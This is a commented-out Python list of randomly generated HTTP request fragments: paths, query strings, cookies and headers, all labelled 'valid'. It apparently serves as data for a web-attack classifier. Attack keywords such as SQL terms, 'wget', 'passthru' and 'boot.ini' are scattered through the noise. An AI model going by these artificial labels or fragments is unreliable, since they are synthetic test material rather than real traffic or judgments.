#   'type': 'valid'},
#  {'pattern': 'ikooekjnrhtr9=0725&wxf2dopttit0=625144715&s7snen=eby7)zepyb 8e&tl9noaeel=8&ehpbhsit5lsr=as&1m=mdl&peei3t=831768038&e2tiakthc6n=havingloi?&f@.qlkv3kkql=sunion',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '6bp0wpn=8256265039', 'type': 'valid'},
#  {'pattern': 'g91enhat1=elsimeaate&gp0khqniie1=30146118&sservices23xsn2==y &obngahotc0axcf= &ersupnhnshha=raeb;sb&dheenncer=82&k7dr%uc5v=oz5p&f1esezmie5aaotl=ao% dtnliioftr/rpe&er8a=mhe1cutsr&dmmiuw=94071&0oyte=7596&tehes=11865429',
#   'type': 'valid'},
#  {'pattern': 'sesgls7uqiyieae=41828528;4fnpn79isicte=81;lgmail-m=chgtio',
#   'type': 'valid'},
#  {'pattern': 'izfqefe7-eop;q=0.9, ho-bws', 'type': 'valid'},
#  {'pattern': 'mozilla/0.8 (compatible; xfodeeah7; windows nt; rhtt; e4umebii)',
#   'type': 'valid'},
#  {'pattern': '*;q=0.2', 'type': 'valid'},
#  {'pattern': '*;q=0.2', 'type': 'valid'},
#  {'pattern': '/i87lq7cm/i9e@suhjx5ox.ux/icyyvtd6hb/cltrxeetalwxieapm0d/ejus/oe6edafhandel3n/4ofkrsc80n5htqxj6u/oflponrukicpw-sx6f0j/aeot/sxjzqygyje/kcformu.pl',
#   'type': 'valid'},
#  {'pattern': '/tehleafrs6trtut/rnothslaer5yueit.exe', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'sesgls7uqiyieae=41828528;4fnpn79isicte=81;lgmail-m=chgtio',
#   'type': 'valid'},
#  {'pattern': '/eeshatvoeetrjvc7ii/rrzao79ybz.9l43/2enhtgzsyaneseraod6/3j3cfvcxechony1en/omhoonemaclsnvo/ontllhteih0ereaes.png',
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.7', 'type': 'valid'},
#  {'pattern': 'w9dtnrdthqs5s', 'type': 'valid'},
#  {'pattern': 'lwmheqe6nhnoaj=pm<optnunreinsertti9group byyii=&thmon18dm9o=8714',
#   'type': 'valid'},
#  {'pattern': '/trioaicyrtoweuiaast/aw/rucrh/namsseuoarasorn22tf/ach7nkm8pqrseg3lxcnb/fnwf/adsyh_nufoe9-352ljn.asmx',
#   'type': 'valid'},
#  {'pattern': 'sesgls7uqiyieae=41828528;4fnpn79isicte=81;lgmail-m=chgtio',
#   'type': 'valid'},
#  {'pattern': 'thtovluhthhp=r0d&entasznbantsp= ?i nehh&viohsrroe=iherhrtie2rotu&1odrhoe6iwsjhv=6568442&@s.xlfc8z=0.6.p&8otltrare6eide=taal6eph~siao>g7e&mlle6=op0znr&il_5o4pm2rm=750081&tltb=trje@-&ketee=318283&toe8glecu= l?tts: b8',
#   'type': 'valid'},
#  {'pattern': 'mozilla/9.4 (windows; u; win 9x 0.3; n1-3q; rv:1.4.3) gecko/68924305',
#   'type': 'valid'},
#  {'pattern': '/h99og92ksnqo/tkmzem5ijmetapduyj/myiip5dnhbptmpusr@w/ekqqd2m/iswssk9vso/rgi2g/a4itjxn.tiff',
#   'type': 'valid'},
#  {'pattern': '29v1tr1h http://www.ntdnre.com', 'type': 'valid'},
#  {'pattern': '4m-n3rcnult;q=0.8, anemyt-1hxsa;q=0.2, oondrsn-klqecam1, drys-pes;q=0.4',
#   'type': 'valid'},
#  {'pattern': '/cgljvy02djinams/hfebnfi/joo@/ngmbiw7nxun0o/tp-3/tj2nyfwdg3jsn@nzgwzl/aes/andaooannla9hi/mmfp8zvcs/ea7tdgdadrreuf.aspx',
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.9, gzip, deflate;q=0.6, identity;q=0.1',
#   'type': 'valid'},
#  {'pattern': 'iex=58460828;jhiphpof3qcopy=ds1ciju bchildle;dnsaes6oibez=nadehmrsrjrnti;7nmg=3eael;s2sm=eopted',
#   'type': 'valid'},
#  {'pattern': 'iex=58460828;jhiphpof3qcopy=ds1ciju bchildle;dnsaes6oibez=nadehmrsrjrnti;7nmg=3eael;s2sm=eopted',
#   'type': 'valid'},
#  {'pattern': '/bztoptwindow.open4/bpboot.initp_5l/u2ceiaccsjii/pstdinulvmfbg/t8rojgh4/i3taepwmfaa/qpwm.ydxrng7rmb.ms.nsf',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'cgrsvltiig9=25access_logbtrecena&8i=3pitjq&eesschsenosirv=vz3&tln=ahd9ccattncnnas3ftp]nd%&iotye=7 &7e4=cnfriixftdn&uueniatirn=20414&3xneerterrn=al',
#   'type': 'valid'},
#  {'pattern': '/ausrgloirlsu/ytaa/h5scl/swf3vgihjpettipthonw.shtml',
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.2 (compatible; msie 8.9; open bsd i386; mebmlpu; oinitlo3s; renenumeh)',
#   'type': 'valid'},
#  {'pattern': 'mnh8c=5611&gnlho=bcnt8euth&yirgi=get:emetan6&r8kdc=ol5&cciir=ioins5n&pozvefip=bi&ulyolpeanet=7991549672&toxowttt=wp-jteichild&rerilodpc4dse=wsmwiaruaeqqi6ohah&3oietitrh3tcp=it/fi&s-aq-ldocument=1&oaqi=yi%uyaee62e',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': '/h8h2mgroup byf_d2acke/p7whereznv@vab5u/mnn.aspx',
#   'type': 'valid'},
#  {'pattern': '/mljq.zjo/ncks7x3/eby@/ssyl_b1/bnodt/tu5mcnit1uyn0odmaxz/efpqp/ooiqljnigu_.htm',
#   'type': 'valid'},
#  {'pattern': '/eihemi9mblb/0k.gif', 'type': 'valid'},
#  {'pattern': '/4lcbn@jvlservicestov/avm@xm2vpxworcag41n/bhcuaoyseg/iykzeiotkeqsrkms/2a-xt/ojvpefx2s.kscju/eoava7hlist.jsp',
#   'type': 'valid'},
#  {'pattern': 'umoprocessing-instruction7=4', 'type': 'valid'},
#  {'pattern': 'umoprocessing-instruction7=4', 'type': 'valid'},
#  {'pattern': 'identity, compress;q=0.8, gzip, identity;q=0.5',
#   'type': 'valid'},
#  {'pattern': 'oi5inwehokeoe=ti&raiub=auylcmnhz9', 'type': 'valid'},
#  {'pattern': 'ngn0=betweendtotscript5jtu4rtgoit8&ogeaoof1=27&oaoxass=nereisgx3cxhsnnu&bhlju3zcetcf=tfm&acu=-ehtpassc:&4lt=cxsiid~6rz[&dqco72esjmpa=32278041&cc@g6vmimhps=str&ers=ldo2inll<aat&ehatbg1seih=gneegossifr4rt',
#   'type': 'valid'},
#  {'pattern': '/kevnmtkqmaidkhhexua/trdhp9atwta/edtr9/iraaitldtd0e/esazkugr9t@gdz/oa3x/nautoexecjopnrc9jozftp/w0spushr/re4nmheianmdrqee3.mdb',
#   'type': 'valid'},
#  {'pattern': '/adminccmawnunionjatc/jvcrcpd@hqvi4kx/asi1o.mspx',
#   'type': 'valid'},
#  {'pattern': '/risortmmr/qtilg5bvdrlocation/usiw1omnmemo.png',
#   'type': 'valid'},
#  {'pattern': '/bd_pic.2perl1nf/oronwhe/annuutoozaruc/rtldeadsc1jieaite/ettsn/hn.wssxvoo2nkksnro/ne7oihbci-pisr6-aqkj/rpzafa-sl/sstrozewhonrm1.php',
#   'type': 'valid'},
#  {'pattern': 'deflate;q=0.4, gzip, gzip;q=0.6, gzip;q=0.6', 'type': 'valid'},
#  {'pattern': 'xbudegohlz0=e;s&tpc=lv8tbjo0&fsgidg=9409647&nabvw=870292&itla1teen=6197531&auevtylc= esr &ydcter=~hteeu ahinhttp1vy&deest=e&hzeumail=czz2w&_j1ds@ziwij=eqstaoale2g=@8&dshz=scripte',
#   'type': 'valid'},
#  {'pattern': '/oseoeotef/ntnnsir0th.bin', 'type': 'valid'},
#  {'pattern': 'aueluirssi51d=zr1q;oenh2aii=argcnztreplacei lwiobit;sgi6nbocfneua0n=rdr3x9gx',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '1o8l-ndgrs;q=0.3, u-bu', 'type': 'valid'},
#  {'pattern': '/y8gpozlsf2yldd3aeq/nite/bpo0ghgvgfo2/trerhrkr/d6@.shtml',
#   'type': 'valid'},
#  {'pattern': 'amoxgic=cdvv-37fs;tfnshanc=94514825;oetoo= window.openca;dsnh=vea0moigioh8link;nte3s=3985318',
#   'type': 'valid'},
#  {'pattern': 'eoaws0rut=irewwrtxaubr3oi&3s.obmonodet=pft&.bdo@sqonfwp=oa',
#   'type': 'valid'},
#  {'pattern': "doiw5pvie=ea3b&tccmglimma7rc=632&pexec_inph-xi0g-=79597&alsa=o&qdirfqt=ncr'\\&eeqnfl=2774976&ruisofghvuwost=r&_xhwtuaonjmj=465&wz-fbineobl=4&hnokyf=o rll~t&erok5i=79353055&b6ccubkogmailhm=e eermws6e&tuel0hooksget7=91434",
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': "32ujtn7nt=ih1a &egseen=6&r84hlec=54&esowsjasttssson=abyhm6iasm&5n8sae=cr?ets(mtao&ntntwvteuixnt=fhncnsns&tbobicghsr=hl%uall3anmconnect&nadh=r3ecotter0tcohae&jee=/nc5&aonroti=10977899&etoehacen=ihchildnstbr>m&pbneeendea0=')=a",
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '*;q=0.0', 'type': 'valid'},
#  {'pattern': 'zzphputmpkhrr@fd=grh&disn&noheduaxdfwle=qdhxeecivefdtiiten&q_.2pd932igl=ylocationhtpasspoeno4sogo &nlh58w1uo3whqr=plsn h&otswma97r=ltdecnsi',
#   'type': 'valid'},
#  {'pattern': '/ejbj3shutdowny/tnvz13/rnmdbutoi@-wafor-44/vvfl/ve/czmstss1tutdk/sdatmasmxhnhhsaeancz/formtw0a1epvrg/shonn.htm',
#   'type': 'valid'},
#  {'pattern': 'cobsntefol=nhe', 'type': 'valid'},
#  {'pattern': 'ebg1vhe=ldqtcng&kaccepto7t=s4vbscript@&thu=c&n&8tlhr=746465518&ole6u=52&edoeu4o=24867885&wtxf7o=h<q/bejt:onai',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'coospiyrlmupud', 'type': 'valid'},
#  {'pattern': 'egd=wnm57cneenotstde;rrznv=awhhzjwegeq_', 'type': 'valid'},
#  {'pattern': 'egd=wnm57cneenotstde;rrznv=awhhzjwegeq_', 'type': 'valid'},
#  {'pattern': 'eonoheethu=a/t&ohrwhereu/i&gan5pletbc7fhy=se htaccest&neraetssdnth=7277692&chsdedsbrnlpn=5639187&i4nar0iadj=485&edsnhextaoilse=0042&r8enrde2n=uynlh2&wimlrra=ueoee uxht&wxk4nyok8z=oiesst&sk1qtpexec-g=byaccept9v&wde=shutdown&bl=tthhwh;riji&ntblentqrn=286687&eeern=dj)rslihtr fadnexec&agop=ics',
#   'type': 'valid'},
#  {'pattern': '/h8vxf0rb/6awrorreit6n/dwizs/ahnbo3odrop.y9-uf/rg-y9wb_sv/pereeoato7ceenoen/lg/mcbagtfw2xb62zwawofx/arphhuht.gif',
#   'type': 'valid'},
#  {'pattern': '/aptcw.6_a.2kuy.ocjrl/ooe/aoceawwelfzik/nw/3vmochafrom/tf877cehsqo2e/nqwmtylw-/wucehocrs/yxgvx8v2b.3w/em9krpy.msf',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'gu=c)7&4ptyasnd4d=pz-.3&hvc=ni3', 'type': 'valid'},
#  {'pattern': 'to4=2426558&eeoaeo9mhteicxr=to] g9p&zqo9.clkdoxc= sht&esoae=cimu&oxecihllueeper=6orrsoy&seh=ianelred4bghki&e3zo=39',
#   'type': 'valid'},
#  {'pattern': '/oe.kshygf7eyx/apsnl1rlmnnehtd/it/ecetakbo3ifiaes/hs1servicesu1gs6g@e/riwtd/ptecloioeetni4iu2esd.bin',
#   'type': 'valid'},
#  {'pattern': '/4rseu4@@k1jtehgh7tmo/yookh/iitisa/x1tmtnnusso/n8d6y9aoofpdx_d/r2ctyqoxpu_7o8a/fcrridsuhdflifahlots/ctp/npcpbcfudp/rdelaltr.jsp',
#   'type': 'valid'},
#  {'pattern': 'txlucghabr http://www.t8iht.gov', 'type': 'valid'},
#  {'pattern': '/.kfk4/ugctltv5eyap.mspx', 'type': 'valid'},
#  {'pattern': '/tvxwosyaosddb8ismrp/0qyc4aqt83njeqffg.dll', 'type': 'valid'},
#  {'pattern': 'aanmge=1022753;tpii=ol;h7zx lz];uooen=3%a;e7es=3183;ame7k=i6',
#   'type': 'valid'},
#  {'pattern': '/dv/roaterofdee4aotss/0de/advg9t7kepu9/qxtocotnuhi/rna_jrnrtjpmlh3n/t9/nr3f/tr2uey8/y2urnwiu01edntt5.html',
#   'type': 'valid'},
#  {'pattern': 'oas=~r(sock_stream$&5elddnodehome6=eudzs6&3egok2m5f@l1=1dpuoiltnmtr&nlusmoliaag=rili9_0ify0s&z0rselectji.x@c=hlsrm9eanl4dt0wtz&ldc=tlt]dnkt=/isn|mlwgetl&43oeslesnbopos=utservices&syyoeolsmp4=s7vbhb8jik&anrshriesem=includehx:&cdaseoeqgeondrd=x6eaos&itpu6cxhswo=ouwot&amteirl7oeipsba=17235',
#   'type': 'valid'},
#  {'pattern': 's4cyld7-wnlt5pld;q=0.5', 'type': 'valid'},
#  {'pattern': '/o-onwhsnrzosmls/_ydpmailw06/glu4yc0dlbhgkul/r0wftpcurdj7ls/bbk/multa6i.php4',
#   'type': 'valid'},
#  {'pattern': 'niajp1=lyeoawtsat&lsrt=dl &manee=r8bag&othaapshhnn=ferhal&sfnlee5tuitda=wgs81yxh&sredt9t=6taipsloboni3z6h&likeunask0ao=cla9\\$',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'te4esos-memc;q=0.1', 'type': 'valid'},
#  {'pattern': 'ceesmoarel=grcc&osh=ed&ipigaldedtmeeh=eoaf8y3eeixsrseh3&aoheh=hhyee=lnnam%e&tshna=is4rt\\;pe xc&xw&tirdap=s>dur42o\\aertm q5vxterme&ytnppvhhhuoz3rh=ej6p-&ntupprnnm5iucj=oetmrtrl5gd&tvrh7fnc=0g@h9e_&msiot2eratuee=12067602&gz2fmkmlinka=hf-',
#   'type': 'valid'},
#  {'pattern': '/f3v7.udmform-q/uore0iv0/slsfozp6aygotxfieo/f3rejtjlh/troqiu/6taultisemitm.html',
#   'type': 'valid'},
#  {'pattern': '/usjhsiaezlti2s9.cfm', 'type': 'valid'},
#  {'pattern': '/thcb1nilvc5nqkuo9xvb/rvn/jem6rgbw/cdoe6roh/tnoumnkme1sib/zxd_k/mp/ajtaiqtpa2ftns/mencrb2id5/esmom/ceeraterw3s.gif',
#   'type': 'valid'},
#  {'pattern': '/nx_ujxa7arp4/tneeewreln2rxtetsare/k0x9sulxmetaniap6n/shoteio6tzadenletn/dn-ta/dettitlc2bhesnpimceh/onb/0bodychildikep6x.cfm',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '/aqo@nqlleb/aabuehh5befsr/ia/qcpassthru.php4', 'type': 'valid'},
#  {'pattern': '/l-paflm-2-i1ok/hxqeggar/pmc6tb4fx.nsf', 'type': 'valid'},
#  {'pattern': 'od-1, siss-iewbonov;q=0.2, 0he-jn2ee', 'type': 'valid'},
#  {'pattern': 'egxnnvi1a http://www.ehecnf.cz', 'type': 'valid'},
#  {'pattern': '/qf_x5pqzf-f/aszcp8gl7x/i0n/nntnhjtag/yrzx_-xtmv/dri/pde9n1cihfjha.sh',
#   'type': 'valid'},
#  {'pattern': 'compress;q=0.6, deflate;q=0.7, deflate, deflate;q=0.4, compress',
#   'type': 'valid'},
#  {'pattern': '/7ef7yi/iarsu.gif', 'type': 'valid'},
#  {'pattern': '/hmsyggqiahsock_stream/sze/qdhn/ojetxlhfahoolaa/eqkcl/zkywautoexec0yqbnvara9ro/uzh/mu0gutsed4prs0jte/stx-dp-jcat8.asp',
#   'type': 'valid'},
#  {'pattern': '/ehh/ietrpadabtlae/s08a/ip/maoreohthe/esqhctisoe/2la/lsioty/tanenjxesegakaori/oinput/hsqa_wvue.tiff',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.2 (x11; u; unix 3.9; e7-h2; rv:8.7.5) gecko/19805192',
#   'type': 'valid'},
#  {'pattern': 'insertmrs=qjnvneamnne&cemanr=aguub8ymk_l&crircsic=laohst&nz6t0=5082&tvr7=ngroup byttno2eoncin>',
#   'type': 'valid'},
#  {'pattern': '/car-rkgyg/kmhixycd/dkvl5eyeu/i2-r46.mspx', 'type': 'valid'},
#  {'pattern': 'tarozon=ag9ktlet&oth=itp5aasoerht?\\efn&nagbrhnnownhnpr=30562955&ss=aperleh',
#   'type': 'valid'},
#  {'pattern': '/3iqesan9ntuhitofwi/yro0ei/ercojprqcb/62oyxzmmk6vbm/ay6dijedao79nsvs/tcs2fuxto/late0/lpfi08gblsjuy/tri49n3/qsm6c/nyy0h/t8.bin',
#   'type': 'valid'},
#  {'pattern': '/lqvymbbn.fofhwwzyw/8jalggq1v8h/n.ka/scybzspgacjtk/1rg.nsf',
#   'type': 'valid'},
#  {'pattern': '/pij.mspx', 'type': 'valid'},
#  {'pattern': '/hzuq9uyqi9klv/bqkukphbygkz2z/h0tfa.9qquay/ak2sg5dqe3a3gv/3uaefhdentiaeah9tge0/dhndne.mspx',
#   'type': 'valid'},
#  {'pattern': "eeihule9oht=5561374&acsnmhdy=unmo~uj&vufoeo=hh7metaeornx&1imetapiv=50772438&osots=m8lv8f&ifecga=ceimeoeseoe nm&htehuwob3r1eufo=ueuyuen&nsaenscjhzthotu=5104&wroalhahsc=a&boot.inikautoexec6mbg=6'eao@elafiiyt0ie&upgygvrw=fbec-&tdcsslfijr5a=lokwretane&ls=neli&ikafjmenoe=258935958",
#   'type': 'valid'},
#  {'pattern': 'jb3nvgyk=7&sh=bimzbbse5-a&uedlsntl=osig8asebbn&measnetnuopes=3960684&ombtamrdnit4eea=lii',
#   'type': 'valid'},
#  {'pattern': 'edg=baeendeaao&eoemuiu1cyent8=haa@&qakc= heirnbetweendh&ioktem38ee=794344&ssalote=t&-hsyjg=0664280558&uo1=o0&u9scriptgm0o=40719&tbiilteldnaaoz=alpvse',
#   'type': 'valid'},
#  {'pattern': 'siidiv2sd=y&tiis5e1=txp_e&idsey= dsf>lt[a&txiterb9etr31q=btsse8ce&nrbomeuii0d=nr r&hir=wcmzy6jnteq&lrasnehebuzp=ot4zyg4fso5c&he0aio=ehlp&tmpfaxyxp_=gelffrom&hi&thirrae=rzsdfq8ejxv&onl=&>u&29afbnm=aiteqis',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': '/0djoc-vbhecx/laolinnanorutlwec/rnoymsskb9ti1zes/bilagkqvrimgxwc/o3bww9piqizuknmnqt./r4@/c56rh5cupy/mtagi/4@sfv.aspx',
#   'type': 'valid'},
#  {'pattern': 'mozilla/2.5 (x11; u; open bsd i586 0.0; eh-mc; rv:2.9.0) gecko/64051755',
#   'type': 'valid'},
#  {'pattern': '/the/d.ffiu/oeoae.shtml', 'type': 'valid'},
#  {'pattern': 'rsatabi=2130&8logz4l2an3=t&ra=ranwgvwatmk&ihe4eglwee=0bconnect99hsureoi/i6mcdiv=',
#   'type': 'valid'},
#  {'pattern': 'mozilla/4.3 (windows; u; win 9x 9.3; ie-ho; rv:2.3.3) gecko/03746200',
#   'type': 'valid'},
#  {'pattern': '/f_fiepth/reswism2ageed8mejp/nncaicullbe.mdb', 'type': 'valid'},
#  {'pattern': 'gzip, deflate;q=0.0, identity, deflate;q=0.2', 'type': 'valid'},
#  {'pattern': '/.nodegif/3flpdminhtpassw_ermm/sxazgohgg18.ff2t4/pinsafe/iobp0o_ri22a/_kyd6@binmw/decho.h_9cincludej7y8l/abx/_whhz1hq7.png',
#   'type': 'valid'},
#  {'pattern': "wr=s &ds8si=tcmlari6l~3imoa&ieletoueqsni=[ae&ooulacsre=2jaa8tmtsehhaheg&sse=69080&d_5wg47dbd4=duef64usdoeiteeheg&i9r=akp@drqrcim&t4=9034456792&bneenoninau=rfntn/iifanvardsock_streamonv'&25i8oal6a=tf;&sraeogurxbtels7=hvx@06wcce&gxl4s9cminclude=e&neteaic=tn$itolpcesi&tabio=n&nt3okrhhz=6hy",
#   'type': 'valid'},
#  {'pattern': '/dominbwodvleeit/dmr65a/qaausl6sctse7dtkitnt/sz3wbp.n-004/33bmi/b1/reaew/6.at2wzhhjuaorz/k3f8yhdue4/hgay5/8hm7swreklt5qhg.sh',
#   'type': 'valid'},
#  {'pattern': '/oh5io/dzyvl4gm1obxbve/albwxsscpdgcgvq@fkxm/ur48exec_cat6aek1o/n7d5m@0gwinntijww/grxqvk02/_ao4xwo/sjidjor-bd/3mqtwlfgyyld5azd__/lv/xhb/arjzckp.asmx',
# ...
#   'type': 'valid'},
#  {'pattern': '/les1ro/ax-.sxuv3cphwhpis/tk4xjr-ox_0fdlkr/trg6pkvi4/f4d@hyelmcnyw/sefwiabf6knxmf/t6j2xenf3pfl.g6nh.asp',
#   'type': 'valid'},
#  {'pattern': '/4de/bcesylwicng/mxsajesiio/uiiaeautaow/jjb/lvxrq6vta9ckqncps/dsv0cnyyszcqi3/tpna/yt8uteeekflanunrt/ieaoifuoma1n/epj@zo3l3bjn/etsr.css',
#   'type': 'valid'},
#  {'pattern': 'laetoas=826&bniae=4&po=47193233&ahnwti= eatsehyodoi3&nshtw=s0ds&iu=eq@hrxrrqj&vw-6u_6ml4=j1iamuecyzfw',
#   'type': 'valid'},
#  {'pattern': '*;q=0.0', 'type': 'valid'},
#  {'pattern': 'mozilla/6.5 (machintosh; u; ppc mac os x 8.8; ec-bt; rv:9.3.8) gecko/04254685',
#   'type': 'valid'},
#  {'pattern': 'a78sgiiemwls=enka5gva4;gsnha4htveey=4 et;fooalsnbhoirtr=12',
#   'type': 'valid'},
#  {'pattern': 'gzip, deflate;q=0.0, deflate;q=0.5, identity;q=0.9',
#   'type': 'valid'},
#  {'pattern': 'enrpa5tcgai=e kiframedivo19', 'type': 'valid'},
#  {'pattern': 'yp4e-rhgir;q=0.1', 'type': 'valid'},
#  {'pattern': 'arwoyib=duolqbvgdg_g&euruutueaua8od=sf3zkog@nszw&lwlvlm7=9tpk3vpgyr&bthhtopaonnhf=7879',
#   'type': 'valid'},
#  {'pattern': '/tyztv28/eaay6.swf', 'type': 'valid'},
#  {'pattern': '/ecintserst/3u1uw4ts/rid.exe', 'type': 'valid'},
#  {'pattern': 'identity;q=0.7, deflate, gzip, compress;q=0.5, identity;q=0.7',
#   'type': 'valid'},
#  {'pattern': 'alsrehpasfmlf=49821;lifr5ca=66eovstard', 'type': 'valid'},
#  {'pattern': 'alsrehpasfmlf=49821;lifr5ca=66eovstard', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/axydpvxfzfy/ix_r/rwroc52tq.h/trid54/eb@1.jpg', 'type': 'valid'},
#  {'pattern': '/rddmsho8/pzeserdoittr/pfqmpm.mdb', 'type': 'valid'},
#  {'pattern': 'ietp-jt;q=0.5, coefuvz-oqg0ee, a-rsetwce;q=0.4, pohts-ceer;q=0.0, 46fihdia-rl',
#   'type': 'valid'},
#  {'pattern': 'drnaguh=5906000;netieaoe8er=0642648;cot=2540;orx@trcpt=0755;eaxpha=tdl;ewont0aemtiiign=bsgwsolegedd',
#   'type': 'valid'},
#  {'pattern': '*;q=0.7', 'type': 'valid'},
#  {'pattern': '*;q=0.8', 'type': 'valid'},
#  {'pattern': '/go6gb/uwxfmznzc1pc/apoebs/pwerrzc/trmq.c3abrwun-1hk2/tbp/axnacu7sah/r-1osv02t9mjkfl7i9cv/ae/xpgtznhucdn_kand/hi/hecdrctain.cgi',
#   'type': 'valid'},
#  {'pattern': 'mozilla/2.2 (compatible; msie 7.1; linux i586; e7ohtalte; btfoj4)',
#   'type': 'valid'},
#  {'pattern': '/ogdg/gpp/l7xb/tn/n1wgucbgxxzhkqd5pnl.tiff', 'type': 'valid'},
#  {'pattern': '/po3rt-rewetcl0s/fyhcrqwdee942_s@v/29kp6l154p/dh7s1/blyg6s1ojwl3eulcihk/pwn9vntacc_/o6kca23dhsgpmjyw/dmxxifm7/rxze6rphc.jpg',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 's-ebkaxeau;q=0.0, cdne-nanpcf7i, 8ei-e, zneo-rhaiij',
#   'type': 'valid'},
#  {'pattern': 's-ebkaxeau;q=0.0, cdne-nanpcf7i, 8ei-e, zneo-rhaiij',
#   'type': 'valid'},
#  {'pattern': '9iq4uvnodejp4body=eiketrrxois&on=ufp1mjwx&akl=bhbi&lnrbd9dkp0tnc=teboot.initchomexold3a9/m%m5e&wio3t=a&gbeabcyo5wjs=pzty&hddwu=oywu&rtis8rurprmtekn=mwget',
#   'type': 'valid'},
#  {'pattern': 'btsmrehta=eg=t;nti9vdq=20583625;node2zealu=anntnchu;oes=ote~;drop5yv=xnmu',
#   'type': 'valid'},
#  {'pattern': 'mozilla/0.8 (machintosh; u; ppc 9.0; os-en; rv:7.0.7) gecko/38035384',
#   'type': 'valid'},
#  {'pattern': 'dyyr=ejhyobvy70', 'type': 'valid'},
#  {'pattern': '/5awnamn/9jpiiw5vzvoxytdo3/rqp7fgoni90eu/ftzege1/lhtpassp/lo/fwfoudf1-xm/uvfpaaku-_.gif',
#   'type': 'valid'},
#  {'pattern': '/8f9thc/t6myg42nngfni9rtf/go/luitodh/efeniesiadrnei/terecba4stgmoerudwe/e6xdne/9xel1/gwfotgfzyxz_/nnty0_ji57hfrjwtrc@0/lxmj/ie.asmx',
#   'type': 'valid'},
#  {'pattern': '/b0jxoh9qoqyhm/satpqo/sqrw.8rk4fqu8s9ofdwa/h@kq41mqm8go672hb/iwsgehdr6rdrwmee4rxo/ohga/etz3ytyahrpr0xc79/sutlecsheh6uea/2p/n9eirmgs5tthessgsili.tiff',
#   'type': 'valid'},
#  {'pattern': '/tecetrr7/ttxu9kug/n_hj0py/oinputt/cbzoesebuimheuihhr/s6a2hh34fnre@fxu/sp6iecimr0/ufstfrtrirtl9aue/nmz@08.js',
#   'type': 'valid'},
#  {'pattern': 'identity, deflate, identity;q=0.4, compress;q=0.8',
#   'type': 'valid'},
#  {'pattern': 'y5enttesmo9e=0062881', 'type': 'valid'},
#  {'pattern': 'gzip;q=0.8, compress, compress', 'type': 'valid'},
#  {'pattern': 'iiey2iracaey6g=66236256;neio=ed;aeiloi=obzebti',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.5 (machintosh; u; mac os x 3.0; hk-yh; rv:7.1.2) gecko/43195036',
#   'type': 'valid'},
#  {'pattern': 'rt0tkysheynuem=8085646', 'type': 'valid'},
#  {'pattern': 'sredqerehs1eeee=49463363', 'type': 'valid'},
#  {'pattern': '/ax/qzn9o_logqvarswfc-c/xv3wxu_9r_my/x.0aexeciur@oy/gkmeihsvdiieraoryg7e/dkfphppoiolwp-8qa/4rh@rwhk/tmt4xono/eyoh9h/etdkxnhb0vmq/0ahcxb6r4bwib.mdb',
#   'type': 'valid'},
#  {'pattern': '/htpehutayuaa3tl.cfm', 'type': 'valid'},
#  {'pattern': 'n6aesuesz4=92;7rpcbrudjn=eehxyxoa;cedlea=ospnesolog',
#   'type': 'valid'},
#  {'pattern': 'r0s1=s-i&amtir=122004&elyt0.pbodyhbj=41241752&meohoo=718&vna=et eerr&evart0e=0&ls=aae8iflho4a',
#   'type': 'valid'},
#  {'pattern': '/ifgrrix/o9vp_/4e/einorogztsc4qdmnh/dt5p9t9/rd/egt-_pijfp5lbucdnkeb/pnl5ztnjhin/nk6spmu0mgemubj8plt/@j-5cf.oqzs/rla5wnrcmfi6eroi3nt/ipq1.php3',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '/6byqiserviceszcvvqttf8/seqje/etkpir5kay8hsrcxrhh/ohetok6.mspx',
#   'type': 'valid'},
#  {'pattern': 'etfg-epdtuz, 6st94dn-i, r-ot;q=0.6, fbeh35ns-lqnibros',
#   'type': 'valid'},
#  {'pattern': 'oi7am=in-)e%te@s/twe;9ricopynyo=utraaiaee;nhit1dsoedge=45;rmtiuskit=-b 6usttbenri;tpemiaer=1866',
#   'type': 'valid'},
#  {'pattern': 'uannai=3&img1fj9uyvwzw5=ya.uduvqp&oeesuyrmg5tloe=844165&xkhm0dwf=0he&er=eqeoehadtr&0qnpv=diov2aswdx',
#   'type': 'valid'},
#  {'pattern': '/syzynq/uzwzws0mhi11na00p/otwxky/im/y62nzw7y9tjbo6njue@/mpybu7onwnivil.ucoce/bewatrrthtogecweegu.jpeg',
#   'type': 'valid'},
#  {'pattern': '1tndyat/0.0.4.9', 'type': 'valid'},
#  {'pattern': 'ekf=rtn2snxc', 'type': 'valid'},
#  {'pattern': '/hq_-su4urghdthr/5wxefa4hhaoqa.cfm', 'type': 'valid'},
#  {'pattern': '/fylm_c9pc66jrx4ynkx/bd-ajun2og@52zr/ntzcmiibnn/hcmgecorycoua5/j1@wx.jfo/fkp@-k7z7a9/reedcroloao/1nj2wrzs/dbesytslglnx8iwptox/mier/cdt2dakiyhoiz8dhip/edcn1olb.tiff',
#   'type': 'valid'},
#  {'pattern': '/bpjpj.jpg', 'type': 'valid'},
